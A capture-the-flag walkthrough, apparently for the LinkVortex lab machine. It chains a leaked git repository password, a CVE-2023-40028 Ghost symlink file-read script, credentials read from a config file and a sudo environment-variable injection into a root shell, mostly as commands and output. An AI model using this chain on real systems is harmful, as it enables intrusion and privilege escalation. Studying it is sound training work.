@@ -1,0 +1,135 @@
+
+
+
+website is powered by Ghost 5.58
+
+" CVE-2023-40028 affects Ghost, an open source content management system, where versions prior to 5.59.1 allow authenticated users to upload files that are symlinks. This can be exploited to perform an arbitrary file read of any file on the host operating system. "
+
+
+
+
+at dev.linkvortex.htb/.git
+
+git-dumper
+
+git restore --staged . && git diff
+diff --git a/ghost/core/test/regression/api/admin/authentication.test.js
+b/ghost/core/test/regression/api/admin/authentication.test.js
+index 2735588..e654b0e 100644
+--- a/ghost/core/test/regression/api/admin/authentication.test.js
++++ b/ghost/core/test/regression/api/admin/authentication.test.js
+@@ -53,7 +53,7 @@ describe('Authentication API', function () {
+it('complete setup', async function () {
+const email = 'test@example.com';
+- const password = 'thisissupersafe';
++ const password = 'OctopiFociPilfer45';
+const requestMock = nock('https://api.github.com')
+.get('/repos/tryghost/dawn/zipball')
+
+
+
+chmod +x CVE-2023-40028.sh
+./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
+WELCOME TO THE CVE-2023-40028 SHELL
+file>
+
+"We will get a small interface where we can type the file name we want, and the script will perform
+all the same actions we did manually before.
+Since we can now read files on the system, let's search for sensitive files that might contain
+passwords, such as ghost's configuration files. A quick Google search leads us to this possible
+file /var/lib/ghost/config.production.json "
+
+file> /var/lib/ghost/config.production.json
+<...SNIP...>
+"host": "linkvortex.htb",
+"port": 587,
+"auth": {
+"user": "bob@linkvortex.htb",
+"pass": "fibber-talented-worth"
+}
+<...SNIP...>
+
+
+┌──(kali㉿kali)-[~]
+└─$ ssh bob@linkvortex.htb
+The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
+ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
+bob@linkvortex.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
+bob@linkvortex:~$ 
+
+bob@linkvortex:~$ sudo -l
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
+    env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
+#!/bin/bash
+
+QUAR_DIR="/var/quarantined"
+
+if [ -z $CHECK_CONTENT ];then
+  CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ "$LINK" =~ \.png$ ]]; then
+  /usr/bin/echo "! First argument must be a png file !"
+  exit 2
+fi
+
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+  LINK_NAME=$(/usr/bin/basename $LINK)
+  LINK_TARGET=$(/usr/bin/readlink $LINK)
+  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
+    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
+    /usr/bin/unlink $LINK
+  else
+    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
+    /usr/bin/mv $LINK $QUAR_DIR/
+    if $CHECK_CONTENT;then
+      /usr/bin/echo "Content:"
+      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
+    fi
+  fi
+fi
+bob@linkvortex:~$ 
+
+bob@linkvortex:~$ sudo CHECK_CONTENT='bash -i' /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/exploit.png
+/opt/ghost/clean_symlink.sh: line 5: [: bash: binary operator expected
+bob@linkvortex:~$ # create a small payload that execs an interactive root bash
+cat > /tmp/payload.sh <<'EOF'
+#!/bin/bash
+# replace this process with an interactive root bash attached to the current TTY
+exec /bin/bash -i
+EOF
+chmod +x /tmp/payload.sh
+
+# safe symlink target (must NOT include 'etc' or 'root')
+touch /tmp/dummyfile
+ln -sf /tmp/dummyfile /tmp/exploit.png
+bob@linkvortex:~$ export CHECK_CONTENT=/tmp/payload.sh
+sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/exploit.png
+Link found [ /tmp/exploit.png ] , moving it to quarantine
+root@linkvortex:/home/bob# id
+uid=0(root) gid=0(root) groups=0(root)
+root@linkvortex:/home/bob# cat /root/root.txt
+b8ace1ef6f1664e7eb6bb3cb1a5c8efd
+root@linkvortex:/home/bob# 
